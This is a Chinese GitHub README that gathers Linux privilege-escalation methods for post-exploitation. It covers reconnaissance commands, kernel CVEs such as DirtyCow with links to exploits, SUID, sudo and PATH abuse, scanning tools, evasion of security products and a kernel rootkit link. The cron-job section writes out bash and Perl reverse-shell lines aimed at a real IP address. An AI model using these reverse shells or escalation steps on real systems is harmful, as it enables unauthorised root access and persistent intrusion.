# 《Linux提权方法论》

![LinuxTQ](https://socialify.git.ci/Getshell/LinuxTQ/image?description=1&descriptionEditable=%E3%80%8ALinux%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E8%AE%BA%E3%80%8B&font=Bitter&forks=1&issues=1&name=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Light)

本项目用来记录自己在学习研究Linux提权过程中遇到的一些内容，包括提权漏洞原理或方法工具等。Linux提权在后渗透过程中较为重要，尤其是对于权限维持至关重要。因为=此我们将会在此仓库持续更新Linux提权的相关内容！**但提权有风险，提权需谨慎。不到非提不可的情况下千万不要尝试提权！** 作者：[0e0w](https://github.com/0e0w)

本项目创建于2020年9月29日，最近的一次更新时间为2022年7月18日。

- [01-Linux提权基础知识](https://github.com/Getshell/LinuxTQ#01-linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86)
- [02-Linux内核漏洞提权](https://github.com/Getshell/LinuxTQ#02-linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83)
- [03-Linux其他提权方法](https://github.com/Getshell/LinuxTQ#03-linux%E5%85%B6%E4%BB%96%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95)
- [04-Linux提权利用工具](https://github.com/Getshell/LinuxTQ#04-linux%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7)
- [05-Linux免杀高级提权](https://github.com/Getshell/LinuxTQ#05-linux%E5%85%8D%E6%9D%80%E9%AB%98%E7%BA%A7%E6%8F%90%E6%9D%83)
- [06-Linux内核高级后门](https://github.com/Getshell/LinuxTQ#06-linux%E5%86%85%E6%A0%B8%E9%AB%98%E7%BA%A7%E5%90%8E%E9%97%A8)
- [07-Linux提权环境靶场](https://github.com/Getshell/LinuxTQ#07-linux%E6%8F%90%E6%9D%83%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA)
- [08-Linux提权参考资料](https://github.com/Getshell/LinuxTQ#08-linux%E6%8F%90%E6%9D%83%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99)

## 01-Linux提权基础知识

本部分介绍Linux提权的一些基础内容。包括Linux的基础使用、相关发行版本以及Linux提权的相关概念等。

**一、Linux命令基础**
- https://github.com/0e0w/Linux

**二、Linux用户权限**

在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。

- 文件权限：
  - r 只读
  - w 只写
  - x 执行

**三、Linux内核版本**

内核是系统的心脏，是运行程序和管理磁盘等硬件设备的核心程序。是硬件设备和软件程序间的抽象层。
Linux内核的开发和规范一直是由Linus领导的开发小组控制着，版本是惟一的。开发小组每隔一段时间公布新的版本或修订版，从1991年10月开始，Linus向世界公开发布的内核0.0.2版本到目前最新的内核5.911版本，Linux的功能越来越强大。

Linux内核的版本号命名是有一定规则的，版本号的格式通常为“主版本号.次版本号.修正号”。主版本号和次版本号标志着重要的功能变动，修正号表示较小的功能变更。以5.9.11版本为例，5代表主版本号，9代表次版本号，11代表修正号。其中次版本还有特定的意义：如果是偶数数字，就表示该内核是一个可以放心使用的稳定版；如果是奇数数字，则表示该内核加入了某些测试的新功能，是一个内部可能存在着bug的测试版。

**四、Linux发行版本**

从技术上来说，Linus开发的 Linux 只是一个内核。内核指的是一个提供设备驱动、文件系统、进程管理、网络通信等功能的系统软件，内核并不是一套完整的操作系统，它只是操作系统的核心。

一些组织或厂商将 Linux 内核与各种软件和文档包装起来，并提供系统安装界面和系统配置、设定与管理工具，就构成了 Linux 的发行版本。Linux 的发行版就是将 Linux 内核与应用软件做一个打包。

现在存在成千上万个Linux的发行版本。

- Arch系列：Arch、Manjaro

- RedHat系列：RedHat、CentOS、Fedora

- Debian系列：Debian、Ubuntu、Deepin、Mint

- SUSE系列：opebSUSE

- 其他系列

**五、Linux提权概念**

特权提升（Privilege escalation）是指利用操作系统或应用软件中的程序漏洞、设计缺陷或配置疏忽来获取对应用程序或用户来说受保护资源的高级访问权限。其结果是，应用程序可以获取比应用程序开发者或系统管理员预期的更高的特权，从而可以执行授权的动作。

Linux提权一般是指获取root用户权限的操作过程。

**六、Linux提权目的**

提权操作有风险为什么还要进行提权？什么情况下需要进行提权？获取高权限之后可以做什么？

通过命令执行漏洞获取的一个反弹shell或是通过Web漏洞获取了一个Webshell后，一般情况下权限都较低。在执行一些重要敏感的操作或是对重要的文件进行修改时无法正常进行，便需要进行提权。Linux中安装的数据库、中间件等一般都不是以root用户启动的，通过数据库或是中间件获取到的权限是是低权限的。

**获取一个root权限是每一个黑客的梦想。**

- 读取写入服务器中的重要文件：
  - 修改root密码
  - 替换系统命令
- 在系统中放置更为隐蔽的后门：
  - ping后门
  - Rootkit
- 保证服务器重启之后权限仍在：
  - 内存后门

**七、Linux提权本质**

Linux提权的本质一方面是信息收集，另一方面是对内核漏洞的掌握情况。

**八、Linux信息收集**

任何提权的第一步操作一定是对操作系统进行信息收集。提权是否成功的关键是信息收集是否完整。
- 内核设备信息：
  - uname -a    打印所有可用的系统信息
  - uname -r    内核版本
  - uname -n    系统主机名。
  - uname -m    查看系统内核架构（64位/32位）
  - hostname    系统主机名
  - cat /proc/version    内核信息
  - cat /etc/*-release   分发信息
  - cat /etc/issue       分发信息
  - cat /proc/cpuinfo    CPU信息

- 用户和群组信息：
  - cat /etc/passwd     列出系统上的所有用户
  - cat /etc/group      列出系统上的所有组
  - grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'  列出所有的超级用户账户
  - whoami              查看当前用户
  - w                   谁目前已登录，他们正在做什么
  - last                最后登录用户的列表
  - lastlog             所有用户上次登录的信息
  - lastlog -u %username%  有关指定用户上次登录的信息
  - lastlog |grep -v "Never"  以前登录用户的信息

- 用户和权限信息：
  - whoami        当前用户名
  - id            当前用户信息
  - cat /etc/sudoers  谁被允许以root身份执行
  - sudo -l       当前用户可以以root身份执行操作

- 环境系统变量信息：
  - env        显示环境变量
  - set        现实环境变量
  - echo %PATH 路径信息
  - history    显示当前用户的历史命令记录
  - pwd        输出工作目录
  - cat /etc/profile   显示默认系统变量
  - cat /etc/shells    显示可用的shell

## 02-Linux内核漏洞提权

Linux提权最主要的方式成功率最高最好的方式是利用内核漏洞进行提权操作。

**一、CVE-2016-5195**
大名鼎鼎的脏牛(DirtyCow)提权漏洞。官网：https://dirtycow.ninja

- 影响版本：
  - Linux kernel >= 2.6.22（2007年发行，到2016年10月18日才修复）
  - https://help.aliyun.com/knowledge_detail/44786.html

- 漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。
- 提权利用：
  - https://github.com/dirtycow/dirtycow.github.io
  - https://github.com/gbonacini/CVE-2016-5195
  - https://github.com/FireFart/dirtycow
  - https://github.com/Rvn0xsy/reverse_dirty
- 参考链接：
  - https://www.jianshu.com/p/df72d1ee1e3e

**二、CVE-2019-13272**

- https://github.com/oneoy/CVE-2019-13272
- https://github.com/Huandtx/CVE-2019-13272
- https://github.com/icecliffs/Linux-For-Root

**三、CVE-2017-16995**

- https://github.com/Al1ex/CVE-2017-16995
- https://github.com/Jewel591/Privilege-Escalation

**四、CVE-2019-14287**

- https://github.com/Twinkeer/CVE

**五、内核漏洞提权汇总**
- https://github.com/SecWiki/linux-kernel-exploits

**六、内核漏洞提权参考**
- https://www.secice.cn/post/3574493e
- CVE-2022-0847

## 03-Linux其他提权方法

**一、抓取密码提权**

- 密码Hash破解
  - hashcat 6.1.1
  - https://github.com/hashcat/hashcat
  - https://samsclass.info/123/proj10/p12-hashcat.htm
- 密码Hash嗅探
  - mimipenguin 桌面版
  - https://github.com/huntergregal/mimipenguin

**二、计划任务提权**
- https://www.secice.cn/post/75fd4604
- 利用原理：
  - 当 /bin/sh指向/bin/dash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹： * * * * * root bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
    这样弹shell的时候不知道为什么很慢，耐心等等
  - */1 * * * * root perl -e 'use Socket;$i="106.13.124.93";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

**三、利用SUID提权**

- SUID概念：SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。
- SUID提权：什么是suid提权呢？一个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，那么我们就能从普通用户提升到了root权限了。
- 在本地查找符合条件的文件。
  - find / -user root -perm -4000 -print 2>/dev/null
  - find / -perm -u=s -type f 2>/dev/null
  - find / -user root -perm -4000 -exec ls -ldb {} \;
- 常见的可以提权的程序
  - nmap vim find Bash More Less Nano cp netcat

- 相关工具：
  - https://github.com/Jewel591/suidcheck

- 参考链接：
  - https://www.secice.cn/post/a20c8cf4
  - http://zone.secevery.com/article/1104
  - https://www.anquanke.com/post/id/86979
  - https://www.cnblogs.com/Qiuzhiyu/p/12528319.html
  - http://www.oniont.cn/index.php/archives/142.html
  - https://blog.csdn.net/fly_hps/article/details/80428173
  - https://blog.csdn.net/qq_36119192/article/details/84872644
  - https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html

**四、利用SUDO提权**

Linux系统中可以使用sudo执行一个只有root才能执行的命令，配置文件保存在/etc/sudoers，sudo -l可以列出当前用户支持sudo的命令。

尽量从代码层面进行对漏洞的分析。

- 参考链接
  - https://zhuanlan.zhihu.com/p/130228710
  - https://blog.csdn.net/qq_44854093/article/details/93537827
  - https://www.cnblogs.com/ethtool/p/12176730.html
  - https://www.cnblogs.com/chenlifan/p/13362218.html
  - https://www.cnblogs.com/liuzhiyun/p/11937764.html
  - https://www.secice.cn/post/94404766

**五、环境变量提权**

- 查看当前环境变量：
  - echo $PATH

- 参考链接：
  - https://xz.aliyun.com/t/2767
  - http://www.361way.com/path-attack/5955.html
  - https://www.cnblogs.com/zlgxzswjy/p/10373808.html
  - https://blog.csdn.net/qq_27446553/article/details/80773255

**六、root权限运行的服务**
- 以root的运行的服务，其中包括第三方软件都可以进行提权。

**七、其他漏洞提权参考**
- https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics

## 04-Linux提权利用工具

**一、本地扫描工具**
-  https://github.com/mi1k7ea/M7-05
- https://github.com/rebootuser/LinEnum
- https://github.com/jidongdeatao/LinuxTest
- https://github.com/mzet-/linux-exploit-suggester

**二、内核漏洞查询**
- searchsploit
  - searchsploit linux 2.6 ubuntu priv esc
  - searchsploit Privilege Escalation

- 其他工具

**三、其他综合工具**
- https://github.com/topics/privilege-escalation
- https://github.com/topics/privilege-escalation-exploits
- https://github.com/topics/kernel-exploitation
- https://github.com/topics/linux-kernel
- https://github.com/topics/linux-exploits
- https://github.com/rebootuser/LinEnum
- https://github.com/mzet-/linux-exploit-suggester
- https://github.com/topics/kernel-exploitation
- https://github.com/topics/linux-kernel
- https://github.com/topics/linux-exploits

## 05-Linux免杀高级提权

本部分对新手来说是难点。毕竟在安装了防护软件的Linux上进行提权操作需要一定的功力。但作为一个高级安全研究人员，应该时刻铭记，安全软件永远是一堆没用的废铁盒子！

**一、Linux防护软件**
- 安全狗 云垒
- 奇安信 天擎
- [云锁服务器端Linux版](http://www.yunsuo.com.cn/download.html)
- [护卫神主机大师Linux版](https://www.hws.com/soft/LinuxMaster)
- [瑞星杀毒软件Linux全功能版](http://ep.rising.com.cn/xunihua/2017-02-20/18683.html)
- 火绒EDR Linux版本
- 深信服EDR Linux
- 亚信EDR Linux
- 参考：https://github.com/Goqi/AvHunt

**二、免杀高级提权**
- 暂时略，待更新。

## 06-Linux内核高级后门

- https://github.com/imagemlt/rootit.ko

## 07-Linux提权环境靶场

- https://github.com/rishabhkant07/Privilege-Escalation-Cheatsheet-Vulnhub-

## 08-Linux提权参考资料

- https://github.com/Getshell/LinuxTQ
- https://github.com/SecWiki/linux-kernel-exploits

[![Stargazers over time](https://starchart.cc//Getshell/LinuxTQ.svg)](https://starchart.cc/Getshell/LinuxTQ)